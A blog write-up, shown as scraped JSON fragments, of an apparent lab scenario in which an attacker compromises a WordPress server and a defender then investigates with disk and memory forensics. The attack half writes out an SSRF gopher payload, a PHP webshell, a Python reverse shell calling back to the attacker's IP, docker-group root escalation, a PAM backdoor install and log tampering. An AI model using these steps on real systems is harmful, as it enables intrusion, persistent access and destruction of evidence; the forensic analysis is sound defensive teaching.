gopher://127.0.0.1:3306/_%ac%00%00%01%85%a2%3f%00%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%77%70%5f%6d%79%73%71%6c%5f%75%73%65%72%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%04%39%32%30%36%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%07%31%30%2e%31%2e%33%37%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%30%00%00%00%03%73%65%6c%65%63%74%20%75%73%65%72%5f%6c%6f%67%69%6e%2c%75%73%65%72%5f%70%61%73%73%20%66%72%6f%6d%20%77","date":"2019-12-27","objectID":"maki.bzh/realgsmoveinsilencelikelasagna/:2:3","tags":["methodology","blue team","red team","forensic","pentest","web","docker","ssrf","garfield"],"title":"Real Gs move in silence like lasagna","uri":"maki.bzh/realgsmoveinsilencelikelasagna/"},{"categories":["Posts"],"content":"Offline bruteforce Having a hash, we can try to break it, testing all the possibilities. If it doesn’t work, I can try to upload a webshell via our SSRF host $ echo \"$P$Bi423VbUyNs7iWzYNNDqPBdisIiL.D0\" \u003e hash host $ john hash --wordlist=rockyou.txt Nothing relevant after few minutes. Odie put a strong password or the password is not in the rockyou wordlist. John is able to change wordlists content following preset customization rules. Modifying rockyou will take to long, I decided to do my own wordlist, containing only 8 words: eddiethehead ironmaiden admin root ensibs test administrator wordpress I want to maximize my chances, I decide to use all of John’s customization rules: host $ john hash --wordlist=wordlist --rule=all Warning: detected hash type \"phpass\", but the string is also recognized as \"phpass-opencl\" Use the \"--format=phpass-opencl\" option to force loading these as that type instead Loaded 1 password hash (phpass [phpass ($P$ or $H$) 128/128 AVX 4x4x3]) Will run 8 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status eddiethehead123 (?) 1g 0:00:00:00 DONE (2018-12-27 00:53) 1.298g/s 935.0p/s 935.0c/s 935.0C/s Eddiethehead46..eddiethehead7777 Use the \"--show\" option to display all of the cracked passwords reliably Session completed Great! It worked! The hash is broken, the password is: eddiethehead123. ","date":"2019-12-27","objectID":"maki.bzh/realgsmoveinsilencelikelasagna/:2:4","tags":["methodology","blue team","red team","forensic","pentest","web","docker","ssrf","garfield"],"title":"Real Gs move in silence like lasagna","uri":"maki.bzh/realgsmoveinsilencelikelasagna/"},{"categories":["Posts"],"content":"RCE to reverse shell It’s time for me to log on the WordPress administration panel: username password eddiethehead eddiethehead123 It works like a charm! Now it’s time to execute commands directly on the Linux host. To do that, I just have to edit or upload a PHP page. Nowadays, it’s possible to edit the current CMS theme through the web view. Appearences \u003e Themes \u003e Editor On the right panel, we can see the “inc” folder, inside it, there are some PHP files such as customizer.php. I will inject arbitrary PHP code in this page: This little PHP line will runs the data sent through the “x” GET parameter. Here is an example: host $ curl \"http://192.168.122.147/wp-content/themes/rock-band/inc/customizer.php?x=id\" uid=33(www-data) gid=33(www-data) groups=33(www-data) Perfect, it’s time to execute a reverse shell. The standard method (using netcat) is no longer available since the “-e” argument has been removed. The /dev/tcp/IP/PORT trick is not always possible too. But there are a lot of possibilities to runs a reverse shell, it works with PHP or Python for example. I will not modify the PHP pages any further, in order to avoid damaging the integrity of the site. host $ curl \"http://192.168.122.147/wp-content/themes/rock-band/inc/customizer.php?x=which%20nc\" -\u003e No netcat host $ curl \"http://192.168.122.147/wp-content/themes/rock-band/inc/customizer.php?x=which%20python\" /usr/bin/python Python is present on the remote target, nice. Let’s go get the payload on pentestmonkey: python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' I just have to replace the IP and port with mine. Here is the final payload: http://192.168.122.147/wp-content/themes/rock-band/inc/customizer.php?x=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.122.1\",3615));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]); And now, just listen on your 3615 TCP port using netcat: It’s possible to have a fully interactive shell from this shitty one, using Python and other trick: https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/ I ever presented these tricks in Santhacklaus CTF writeups: https://maki.bzh//courses/blog/writeups/santhacklaus2018/#exploitation-1 But I love GIFs, so here is again :D ","date":"2019-12-27","objectID":"maki.bzh/realgsmoveinsilencelikelasagna/:2:5","tags":["methodology","blue team","red team","forensic","pentest","web","docker","ssrf","garfield"],"title":"Real Gs move in silence like lasagna","uri":"maki.bzh/realgsmoveinsilencelikelasagna/"},{"categories":["Posts"],"content":"From www-data to odie There is no sudo, no vulnerable processes, but let’s take a look about suid binaries and scripts: rev-shell $ find / -perm -4000 | xargs grep -v \"Permission denied\" Binary file /usr/lib/openssh/ssh-keysign matches Binary file /usr/lib/policykit-1/polkit-agent-helper-1 matches Binary file /usr/lib/dbus-1.0/dbus-daemon-launch-helper matches Binary file /usr/lib/eject/dmcrypt-get-device matches Binary file /usr/local/bin/ensibsproject matches Binary file /usr/bin/chsh matches Binary file /usr/bin/newgrp matches Binary file /usr/bin/gpasswd matches Binary file /usr/bin/pkexec matches Binary file /usr/bin/chfn matches Binary file /usr/bin/passwd matches Binary file /usr/bin/sudo matches Binary file /bin/umount matches Binary file /bin/su matches Binary file /bin/ping matches Binary file /bin/mount matches rev-shell $ ls -la /usr/local/bin/ensibsproject -rwsrwsr-t 1 odie odie 8640 Dec 27 05:30 /usr/local/bin/ensibsproject Olala, by chance, Odie puts sticky bit on a binary! What a chance we have! Ok, now, what this binary is doing: rev-shell $ /usr/local/bin/ensibsproject _____ _ _ _ | ____|_ __ ___(_) |__ ___ ___ ___ ___ _ __ ___| |_ | _| | '_ \\/ __| | '_ \\/ __| / __|/ _ \\/ __| '__/ _ \\ __| | |___| | | \\__ \\ | |_) \\__ \\ \\__ \\ __/ (__| | | __/ |_ |_____|_| |_|___/_|_.__/|___/_|___/\\___|\\___|_| \\___|\\__| _ __ _ __ ___ (_) ___ ___| |_ | '_ \\| '__/ _ \\| |/ _ \\/ __| __| | |_) | | | (_) | | __/ (__| |_ | .__/|_| \\___// |\\___|\\___|\\__| |_| |__/ Traceback (most recent call last): File \"/home/odie/project.py\", line 16, in \u003cmodule\u003e import requests ImportError: No module named requests $ strings /usr/local/bin/ensibsproject | grep py /home/odie/project.py rev-shell $ cat /home/odie/project.py #!/usr/bin/python print \"\"\" _____ _ _ _ | ____|_ __ ___(_) |__ ___ ___ ___ ___ _ __ ___| |_ | _| | '_ \\/ __| | '_ \\/ __| / __|/ _ \\/ __| '__/ _ \\ __| | |___| | | \\__ \\ | |_) \\__ \\ \\__ \\ __/ (__| | | __/ |_ |_____|_| |_|___/_|_.__/|___/_|___/\\___|\\___|_| \\___|\\__| _ __ _ __ ___ (_) ___ ___| |_ | '_ \\| '__/ _ \\| |/ _ \\/ __| __| | |_) | | | (_) | | __/ (__| |_ | .__/|_| \\___// |\\___|\\___|\\__| |_| |__/ \"\"\" import requests try: requests.get('http://www-ensibs.univ-ubs.fr/fr/formations/formations/diplome-d-ingenieur-DI/sciences-technologies-sante-STS/diplome-d-ingenieur-cyberdefense-program-icyb00-213.html') flag = 1 except: flag = 0 if flag: print \"ENSIBS Cyberdefense website is up!\" Odie really loves his school, he even made a script for checking the disponibility of the website. Beautiful. However, it’s a python script and the binary seems to be used as a wrapper to execute this script. Fortunately, it got the sticky bit, which means that if we can execute commands through this binary, then we will have rights of odie user on the system. Environment variable PYTHONINSPECT will force the inspection mode. It means a python console will appear at this end of python script execution. With the binary’s rights ;) rev-shell $ PYTHONINSPECT=1 /usr/local/bin/ensibsproject _____ _ _ _ | ____|_ __ ___(_) |__ ___ ___ ___ ___ _ __ ___| |_ | _| | '_ \\/ __| | '_ \\/ __| / __|/ _ \\/ __| '__/ _ \\ __| | |___| | | \\__ \\ | |_) \\__ \\ \\__ \\ __/ (__| | | __/ |_ |_____|_| |_|___/_|_.__/|___/_|___/\\___|\\___|_| \\___|\\__| _ __ _ __ ___ (_) ___ ___| |_ | '_ \\| '__/ _ \\| |/ _ \\/ __| __| | |_) | | | (_) | | __/ (__| |_ | .__/|_| \\___// |\\___|\\___|\\__| |_| |__/ Traceback (most recent call last): File \"/home/odie/project.py\", line 16, in \u003cmodule\u003e import requests ImportError: No module named requests \u003e\u003e\u003e import os; os.system('/bin/bash -p') The “-p” argument of bash allow conserving rights. Otherwise, we would have had a bash as www-data, not really interesting in our case. Let’s see if the user odie got an SSH private key. It would be more convenient with a SSH shell, and more discreet. rev-shell $ ls -la /home/odie/ total 64d drwxr-xr-x 5 odie odie 4096 Dec 27 05:50 . drwxr-xr-x 3 root root 4096 Dec 26 20:18 .. -rw------- 1 odie odie 6335 Dec 27 05:37 .bash_history -r","date":"2019-12-27","objectID":"maki.bzh/realgsmoveinsilencelikelasagna/:2:6","tags":["methodology","blue team","red team","forensic","pentest","web","docker","ssrf","garfield"],"title":"Real Gs move in silence like lasagna","uri":"maki.bzh/realgsmoveinsilencelikelasagna/"},{"categories":["Posts"],"content":"It’s over… host $ chmod 600 odie_priv.key host $ ssh -i odie_priv.key odie@192.168.122.147 odie@webserver $ id uid=1000(odie) gid=1000(odie) groupes=1000(odie),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),108(netdev),999(docker) Yeeeeeeeees! Here I am with the identity of Odie on his system, I will be able to steal all ENSIBS projects! I could stop the attack here… … Or not. In case of real red team operation, you can’t surrender before being root and remove all traces left behind. And when you’re root you’re able to give a little present: a backdoor :D Here, I executed the id command to make sure of my rights. I saw something really nice: the odie user is in the docker group. Odie probably made this because he is too lazy to do sudo before doing some docker stuff. But because of this, I’m able to get root access. Indeed, docker daemon is going to access to the root user, but also to all users in docker group. In this way, it’s possible to get a root shell. odie@webserver $ docker images REPOSITORY TAG IMAGE ID CREATED SIZE hello-world latest 4ab4c602aa5e 3 months ago 1.84kB odie@webserver $ docker run -v /:/hostOS -i -t chrisfosterelli/rootplease Unable to find image 'chrisfosterelli/rootplease:latest' locally latest: Pulling from chrisfosterelli/rootplease 2de59b831a23: Downloading [==========================================\u003e ] 56.22de59b831a23: Pull complete 354c3661655e: Pull complete 91930878a2d7: Pull complete a3ed95caeb02: Pull complete 489b110c54dc: Pull complete Digest: sha256:07f8453356eb965731dd400e056504084f25705921df25e78b68ce3908ce52c0 Status: Downloaded newer image for chrisfosterelli/rootplease:latest You should now have a root shell on the host OS Press Ctrl-D to exit the docker instance / shell root@webserver # id uid=0(root) gid=0(root) groups=0(root) ","date":"2019-12-27","objectID":"maki.bzh/realgsmoveinsilencelikelasagna/:2:7","tags":["methodology","blue team","red team","forensic","pentest","web","docker","ssrf","garfield"],"title":"Real Gs move in silence like lasagna","uri":"maki.bzh/realgsmoveinsilencelikelasagna/"},{"categories":["Posts"],"content":"Post exploitation During post-exploitation, it’s time for backdooring the system and remove all traces left behind. ","date":"2019-12-27","objectID":"maki.bzh/realgsmoveinsilencelikelasagna/:3:0","tags":["methodology","blue team","red team","forensic","pentest","web","docker","ssrf","garfield"],"title":"Real Gs move in silence like lasagna","uri":"maki.bzh/realgsmoveinsilencelikelasagna/"},{"categories":["Posts"],"content":"PAM backdoor PAM means Pluggable Authentication Modules, in other words, and to be brief, it’s the authentication mechanism in modern Linux systems. This mechanism is requested when you’re using SSH, sudo or whatever. Now, what would happen if we added a condition to the code? Something like: “If the password is equal to PlopPlop1337, then log me regardless of the user and the real password”. Many blogs got articles about this kind of backdoor, there are even some GitHub to automate the process: https://github.com/zephrax/linux-pam-backdoor First things to do, determine the PAM version used by the target system: root@webserver $ dpkg -l | grep pam [...] ii libpam-modules:amd64 1.1.8-3.6 amd64 Pluggable Authentication Modules for PAM [...] root@webserver $ wget https://github.com/zephrax/linux-pam-backdoor/archive/master.zip root@webserver $ unzip master.zip root@webserver $ ./linux-pam-backdoor-master/backdoor.sh -v 1.1.8 -p PlopPlop1337 root@webserver $ mv /lib/x86_64-linux-gnu/security/pam_unix.so /lib/x86_64-linux-gnu/security/pam_unix.so.bak root@webserver $ mv pam_unix.so /lib/x86_64-linux-gnu/security/pam_unix.so The first mv is used to do a backup of the existing libary, in case of failure. It’s simple, if I fail my backdoor installation, I will simply broke the authentication system. Ok, the backdoor is installed, let’s test: In two password prompt above, the password was: PlopPlop1337. The system is fully compromised, with perennial access to the system! ","date":"2019-12-27","objectID":"maki.bzh/realgsmoveinsilencelikelasagna/:3:1","tags":["methodology","blue team","red team","forensic","pentest","web","docker","ssrf","garfield"],"title":"Real Gs move in silence like lasagna","uri":"maki.bzh/realgsmoveinsilencelikelasagna/"},{"categories":["Posts"],"content":"Cleaning time Ok, the backdoor is in place and well hidden. Now it’s time to clean our mess. Here some elements to remove: Apache2 logs MySQL logs Authentication logs PHP arbitrary code in the WordPress odie and root history I probably forget things to remove. Some are well known, but others not at all. I must have really forgot things :') Apache logs The access.log file contains Apache2 server logs, each page requested, http method and so on are stored in this file. I just have to find when I started to play with my arbitrary code in the WordPress theme: backdoor $ cat access.log | less -N [Research on \"x=\"] 666 zer.php\u0026theme=rock-band\" \"Mozilla/5.0 (X11; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0\" 667 192.168.122.1 - - [27/Dec/2018:00:35:10 +0100] \"GET /wp-content/themes/rock-band/inc/customizer.php HTTP/1.1\" 500 185 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:64.0) 667 Gecko/20100101 Firefox/64.0\" 668 192.168.122.1 - - [27/Dec/2018:00:35:15 +0100] \"GET /wp-content/themes/rock-band/inc/customizer.php?x=ls HTTP/1.1\" 500 185 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:6 668 4.0) Gecko/20100101 Firefox/64.0\" 669 192.168.122.147 - - [27/Dec/2018:00:35:21 +0100] \"GET /wp-admin/theme-editor.php?theme=rock-band\u0026file=inc%2Fcustomizer.php\u0026wp_scrape_key=370c7cd663254ecfd57bd42d35e 669 318a7\u0026wp_scrape_nonce=1674105339 HTTP/1.1\" 200 12023 \"-\" \"WordPress/5.0.2; http://192.168.122.147\" backdoor $ cat access.log | head -n 666 \u003e access.log.bak backdoor $ mv access.log.bak access.log Moreover, we’re speaking about Iron Maiden since the beginning, 666 is a good number! MySQL logs In /var/log/mysql/ folder there is only one file: error.log. It does not contains that much relevant for a forensic analyst. However, there are .mysql_history file in each users folders: /root and /home/odie. backdoor # cat /home/odie/.mysql_history [legit data] backdoor # cat /root/.mysql_history [legit data] It’s better not to remove everything. Even if Odie is not looking at his logs, let’s try to delete only necessary stuff. Authentication logs The /var/log/auth.log file contains authentication logs, we talked about PAM mechanism earlier. I will take a look inside to know when www-data started to execute Linux commands: $ cat /var/log/auth.log | less -N [Looking for \"www-data\"] 88 Dec 26 20:39:01 webserver CRON[12209]: pam_unix(cron:session): session closed for user root 89 Dec 26 20:41:26 webserver sudo: odie : TTY=pts/0 ; PWD=/var/www/html ; USER=root ; COMMAND=/bin/chown -R www-data:www-data /var/www/html 90 Dec 26 20:41:26 webserver sudo: pam_unix(sudo:session): session opened for user root by odie(uid=0) $ cat /var/log/auth.log | head -n 88 \u003e /var/log/auth.log.bak $ mv /var/log/auth.log.bak /var/log/auth.log PHP backdoor Remember the cute little line in the WordPress theme? Well, it’s time to take it off. However, to avoid generating other apache logs, we will not go through the web interface, but through our favorite command line text editor. backdoor # vim /var/www/html/wp-content/themes/rock-band/inc/customizer.php [Backdoor removing] Users history I logged in with a lot of users during this operation: www-data odie root .bash_history files got polluted. Let’s start with odie: backdoor # cat /home/odie/.bash_history | less -N [...] 156 cd /var/www/html 157 sudo mysqldump wp_db \u003e database_name.sql 158 sudo su 159 docker run -v /:/hostOS -i -t chrisfosterelli/rootplease [...] backdoor # cat /home/odie/.bash_history | head -n 158 \u003e /home/odie/.bash_history.bak backdoor # mv /home/odie/.bash_history.bak /home/odie/.bash_history Same operation with root user: backdoor # cat /root/.bash_history | less -N 23 mysqldump wp_db \u003e database_name.sql 24 md5sum database_name.sql 25 exit 26 exit 27 dpkg -l | grep pam backdoor # cat /root/.bash_history | head -n 26 \u003e /root/.bash_history.bak backdoor # mv /root/.bash_history.bak /root/.bash_history Like KFC, it’s all good. Traces are erased and we kept our backdoor in place. Blue team time Odie, taken in his studies, didn’","date":"2019-12-27","objectID":"maki.bzh/realgsmoveinsilencelikelasagna/:3:2","tags":["methodology","blue team","red team","forensic","pentest","web","docker","ssrf","garfield"],"title":"Real Gs move in silence like lasagna","uri":"maki.bzh/realgsmoveinsilencelikelasagna/"},{"categories":["Posts"],"content":"Forensic environment In order to analyze this case in the best possible conditions, it’s necessary to extract the memory from the server and creating the appropriate volatility profile. ","date":"2019-12-27","objectID":"maki.bzh/realgsmoveinsilencelikelasagna/:4:0","tags":["methodology","blue team","red team","forensic","pentest","web","docker","ssrf","garfield"],"title":"Real Gs move in silence like lasagna","uri":"maki.bzh/realgsmoveinsilencelikelasagna/"},{"categories":["Posts"],"content":"Disk extraction To avoid further corrupting this infected disk, I will make a bit-by-bit copy of it with dd to be able to analyze it safely. For space and portability reasons, I will compress it on the fly: real_odie $ lsblk NAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINT sr0 11:0 1 1024M 0 rom vda 254:0 0 12G 0 disk ├─vda1 254:1 0 10G 0 part / ├─vda2 254:2 0 1K 0 part └─vda5 254:5 0 2G 0 part [SWAP] real_odie $ sudo bash -c \"dd if=/dev/vda1 bs=4M status=progress | gzip \u003e /mnt/vda1_dmp_2019_01.gz\" 10607394816 bytes (11 GB, 9,9 GiB) copied, 167,002 s, 63,5 MB/s 2560+0 enregistrements lus 2560+0 enregistrements écrits 10737418240 bytes (11 GB, 10 GiB) copied, 167,876 s, 64,0 MB/s real_odie $ md5sum vda1_dmp_2019_01.gz 43b967640cc102f05fb2b371516468fa vda1_dmp_2019_01.gz You can download the dump here: https://mega.nz/#!7OgBSCxQ!LVvuyZBfl4aFXAk5VsKs_y-RwmhM8KZeqNhOfBEuu6g Fichier MD5 Lien vda1_dmp_2019_01.gz 43b967640cc102f05fb2b371516468fa https://mega.nz/#!7OgBSCxQ!LVvuyZBfl4aFXAk5VsKs_y-RwmhM8KZeqNhOfBEuu6g ","date":"2019-12-27","objectID":"maki.bzh/realgsmoveinsilencelikelasagna/:4:1","tags":["methodology","blue team","red team","forensic","pentest","web","docker","ssrf","garfield"],"title":"Real Gs move in silence like lasagna","uri":"maki.bzh/realgsmoveinsilencelikelasagna/"},{"categories":["Posts"],"content":"Timeline ","date":"2019-12-27","objectID":"maki.bzh/realgsmoveinsilencelikelasagna/:4:2","tags":["methodology","blue team","red team","forensic","pentest","web","docker","ssrf","garfield"],"title":"Real Gs move in silence like lasagna","uri":"maki.bzh/realgsmoveinsilencelikelasagna/"},{"categories":["Posts"],"content":"Memory extraction To extract the memory from the server, I will use LiME: Linux Memory Extractor. real_odie $ git clone https://github.com/504ensicsLabs/LiME real_odie $ cd LiME/src real_odie $ make real_odie $ sudo insmod lime-4.9.0-8-amd64.ko \"path=/home/odie/memory.dmp format=lime timeout=0\" real_odie $ strings memory.dmp | grep \"Linux version\" [...] Linux version 4.9.0-8-amd64 (debian-kernel@lists.debian.org) (gcc version 6.3.0 20170516 (Debian 6.3.0-18+deb9u1) ) #1 SMP Debian 4.9.130-2 (2018-10-27) [...] ","date":"2019-12-27","objectID":"maki.bzh/realgsmoveinsilencelikelasagna/:4:3","tags":["methodology","blue team","red team","forensic","pentest","web","docker","ssrf","garfield"],"title":"Real Gs move in silence like lasagna","uri":"maki.bzh/realgsmoveinsilencelikelasagna/"},{"categories":["Posts"],"content":"Volatility profile I already presented a way to create a volatility profile in Santhacklaus CTF writeups: https://maki.bzh/courses/blog/writeups/santhacklaus2018/#profile-generation Here, Odie will be doing the same thing: real_odie $ sudo apt install volatility-tools dwarfdump zip real_odie $ cd /usr/src/volatility-tools/linux/ real_odie $ su root real_odie # make real_odie # uname -a Linux webserver 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64 GNU/Linux real_odie # zip Odie_profile.zip /usr/src/volatility-tools/linux/module.dwarf /boot/System.map-4.9.0-8-amd64 adding: usr/src/volatility-tools/linux/module.dwarf (deflated 91%) adding: boot/System.map-4.9.0-8-amd64 (deflated 79%) All we have to do now is import the new profile wherever we want. In order to use it with Volatility. Personally I made a little docker for volatility: https://gitlab.com/Maki_chaz/infosec-docker/tree/master/forensic/volatility $ sudo docker run --rm --name volatility -v /home/maki/Tools/plugin_vol:/opt/plug_vol -v ${PWD}:/opt/usr_land -ti volatility $ vol.py --plugins=plug_vol/ --info | grep Odie Volatility Foundation Volatility Framework 2.6.1 LinuxOdie_profilex64 - A Profile for Linux Odie_profile x64 $ vol.py --plugins=plug_vol/ --profile=LinuxOdie_profilex64 -f usr_land/memory.dmp linux_banner Volatility Foundation Volatility Framework 2.6.1 Linux version 4.9.0-8-amd64 (debian-kernel@lists.debian.org) (gcc version 6.3.0 20170516 (Debian 6.3.0-18+deb9u1) ) #1 SMP Debian 4.9.130-2 (2018-10-27) Everything is finally ready for the analysis! You can download archives below: Fichier MD5 Lien memory.tar.gz ff2d570749e019e00448fc83412ceeb1 https://mega.nz/#!3LA3nQQQ!-2JIOVfsajxS-OPjERK4SEyWetSjyOiyWuPYkiXkqWU Odie_profile.zip 61ab07058a0a66046ad085f0973b1543 https://mega.nz/#!iXgTFazJ!x8w6eZaUcju1Le89nkUMLkSegQe3CD5sJeX8okuoBt8 ","date":"2019-12-27","objectID":"maki.bzh/realgsmoveinsilencelikelasagna/:4:4","tags":["methodology","blue team","red team","forensic","pentest","web","docker","ssrf","garfield"],"title":"Real Gs move in silence like lasagna","uri":"maki.bzh/realgsmoveinsilencelikelasagna/"},{"categories":["Posts"],"content":"DFIR time Finally, the expect moment: the treasure hunt! Odie intends to investigate this mysterious connection. Fortunately, he has been cyberdefense courses at ENSIBS to help him in this task. ","date":"2019-12-27","objectID":"maki.bzh/realgsmoveinsilencelikelasagna/:5:0","tags":["methodology","blue team","red team","forensic","pentest","web","docker","ssrf","garfield"],"title":"Real Gs move in silence like lasagna","uri":"maki.bzh/realgsmoveinsilencelikelasagna/"},{"categories":["Posts"],"content":"Malicious connection So, obviously a suspicious IP is connected: 192.168.122.158 $ vol.py --plugins=../plug_vol/ --profile=LinuxOdie_profilex64 -f memory.dmp linux_netstat \u003e pnetstat $ cat pnetstat | grep '192.168.122.158' TCP 192.168.122.216 : 22 192.168.122.158 :36736 ESTABLISHED sshd/22335 TCP 192.168.122.216 : 22 192.168.122.158 :36736 ESTABLISHED sshd/22341 These connections come from SSH. Let’s see how processes are arranged: $ vol.py --plugins=../plug_vol/ --profile=LinuxOdie_profilex64 -f memory.dmp linux_pstree \u003e ppstree $ cat ppstree Name Pid Uid systemd 1 .systemd-journal 193 .systemd-udevd 216 .systemd-timesyn 289 100 .rsyslogd 324 .dbus-daemon 326 105 .cron 343 .systemd-logind 344 .agetty 371 .sshd 374 ..sshd 409 ...sshd 418 1000 ....bash 419 1000 .....sudo 22887 ......insmod 22888 ..sshd 22335 ...sshd 22341 1000 ....bash 22342 1000 .....sudo 22347 ......su 22348 .......bash 22349 .dhclient 393 .systemd 411 1000 ..(sd-pam) 412 1000 .packagekitd 14659 .polkitd 14670 .containerd 16169 .dockerd 16290 .apache2 21462 ..apache2 21463 33 ..apache2 21464 33 ..apache2 21466 33 ..apache2 21467 33 ..apache2 21589 33 ..apache2 21731 33 ..apache2 21732 33 ..apache2 21733 33 ..apache2 21734 33 ..apache2 21735 33 .mysqld 21557 107 [...] Processes 22341 and 22335 are executes by the IUD 1000, in other words, the user odie. It’s quite surprising. The attacker has been logged in legitimately. If the hacker would abuse a binary, the parent would be this binary and not a legit service (like ssh). In our case, it’s considered as a legit connection for the system, there are two possibilities: The attacker found the odie’s password ; The attacker implemented a backdoor. Odie knows his session password, it’s easy to search it in memory using yarascan plugin from Volatility: $ vol.py --plugins=../plug_vol/ --profile=LinuxOdie_profilex64 -f memory.dmp linux_yarascan -Y \"1r0nm41d3n!\" [...] Task: sshd pid 418 rule r1 addr 0x55f43e6dd646 0x55f43e6dd646 31 72 30 6e 6d 34 31 64 33 6e 21 0d 6c 73 20 2d 1r0nm41d3n!.ls.- 0x55f43e6dd656 6c 61 0d 73 75 64 6f 20 73 75 0d 1b 5b 41 1b 5b la.sudo.su..[A.[ 0x55f43e6dd666 41 1b 5b 41 1b 5b 41 1b 5b 41 1b 5b 41 1b 5b 41 A.[A.[A.[A.[A.[A 0x55f43e6dd676 1b 5b 41 1b 5b 41 1b 5b 41 1b 5b 41 1b 5b 41 1b .[A.[A.[A.[A.[A. 0x55f43e6dd686 5b 41 1b 5b 41 1b 5b 41 1b 5b 41 1b 5b 41 1b 5b [A.[A.[A.[A.[A.[ 0x55f43e6dd696 41 1b 5b 41 1b 5b 41 1b 5b 42 1b 5b 42 1b 5b 41 A.[A.[A.[B.[B.[A 0x55f43e6dd6a6 0d 1b 5b 41 1b 5b 41 1b 5b 41 1b 5b 41 1b 5b 41 ..[A.[A.[A.[A.[A 0x55f43e6dd6b6 1b 5b 41 1b 5b 41 1b 5b 41 1b 5b 41 1b 5b 41 1b .[A.[A.[A.[A.[A. 0x55f43e6dd6c6 5b 41 1b 5b 41 1b 5b 41 1b 5b 41 1b 5b 41 1b 5b [A.[A.[A.[A.[A.[ 0x55f43e6dd6d6 41 1b 5b 41 1b 5b 41 1b 5b 41 1b 5b 41 1b 5b 42 A.[A.[A.[A.[A.[B 0x55f43e6dd6e6 0d 73 79 73 74 65 6d 63 74 20 7f 6c 20 72 65 73 .systemct..l.res 0x55f43e6dd6f6 74 61 72 74 20 61 70 7f 61 7f 70 61 63 65 68 32 tart.ap.a.paceh2 0x55f43e6dd706 7f 7f 7f 68 65 32 0d 1b 5b 41 1b 7f 6d 61 72 69 ...he2..[A..mari 0x55f43e6dd716 61 64 62 0d 65 78 69 74 0d 70 69 6e 67 20 67 6f adb.exit.ping.go 0x55f43e6dd726 6f 67 6c 65 2e 66 72 0d 03 6c 73 20 2d 6c 61 20 ogle.fr..ls.-la. 0x55f43e6dd736 2f 75 73 09 6c 6f 09 62 69 09 09 0d 73 73 68 2d /us.lo.bi...ssh- Interesting, this string appears many times in memory. In sshd process. Let’s locate exactly where: $ vol.py --plugins=../plug_vol/ --profile=LinuxOdie_profilex64 -f memory.dmp linux_proc_maps -p 418 Volatility Foundation Volatility Framework 2.6.1 Offset Pid Name Start End Flags Pgoff Major Minor Inode File Path ------------------ -------- -------------------- ------------------ ------------------ ------ ------------------ ------ ------ ---------- --------- 0xffff9796b895e040 418 sshd 0x000055f43d7d3000 0x000055f43d890000 r-x 0x0 254 1 143894 /usr/sbin/sshd 0xffff9796b895e040 418 sshd 0x000055f43da90000 0x000055f43da93000 r-- 0xbd000 254 1 143894 /usr/sbin/sshd 0xffff9796b895e040 418 sshd 0x000055f43da93000 0x000055f43da94000 rw- 0xc0000 254 1 143894 /u","date":"2019-12-27","objectID":"maki.bzh/realgsmoveinsilencelikelasagna/:5:1","tags":["methodology","blue team","red team","forensic","pentest","web","docker","ssrf","garfield"],"title":"Real Gs move in silence like lasagna","uri":"maki.bzh/realgsmoveinsilencelikelasagna/"},{"categories":["Posts"],"content":"Entrypoint Ok, me and Odie found the backdoor. But if we remove it without finding the entry point, then Monique will be able to install her backdoor again and again, without any problems. Let’s focus on the web server. First of all, finding Apache2 logs: $ cat pfile_list| grep '/var/log/apache2' 529847 0xffff9796ba37d228 /bin/bin/var/log/apache2 530134 0xffff9796b95a23e8 /bin/bin/var/log/apache2/access.log.swp 530135 0xffff9796b954b698 /bin/bin/var/log/apache2/other_vhosts_access.log 530133 0xffff9796b95a2c48 /bin/bin/var/log/apache2/error.log Monique must be a really nice girl. She did backups before removing something. Or she is just a bit stupid and don’t know how to really clean her traces :D $ vol.py --plugins=../plug_vol/ --profile=LinuxOdie_profilex64 -f memory.dmp linux_find_file -i 0xffff9796b95a23e8 -O access.log.swp $ cat access.log.swp | grep 158 | ccze -A | less -I Pro tip: when you have to read large Apache2 logs, and you don’t have super cyber SIEM 4.0, you got ccze. It will colorize the output and will gives this result: Odie sees a beautiful little User-Agent: DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project) DirBuster is a Java tool provided by OWASP, it allows a pentester to bruteforce filenames and directories of a web server according to preset wordlist. Monique IP address tried to find filenames and directories with this tool. Let’s count together most visited web pages: $ cat access.log.swp | awk '{print $7}' | sort | uniq -c | grep -v ' 1 ' 11 / 5 /favicon.ico 2 /icons/ 4 /index.php 2 /index.php/2018/12/27/eddie-the-head/ 6 /test.php 23 /wp-admin/admin-ajax.php 2 /wp-admin/js/media-upload.min.js?ver=5.0.2 3 /wp-admin/themes.php 2 /wp-content/ 12 /wp-content/themes/my-music-band/assets/css/font-awesome/css/blocks.css?ver=1.0 2 /wp-content/themes/my-music-band/assets/css/font-awesome/css/font-awesome.css 10 /wp-content/themes/my-music-band/assets/css/font-awesome/css/font-awesome.css?ver=4.7.0 6 /wp-content/themes/my-music-band/assets/css/font-awesome/fonts/fontawesome-webfont.woff2?v=4.7.0 2 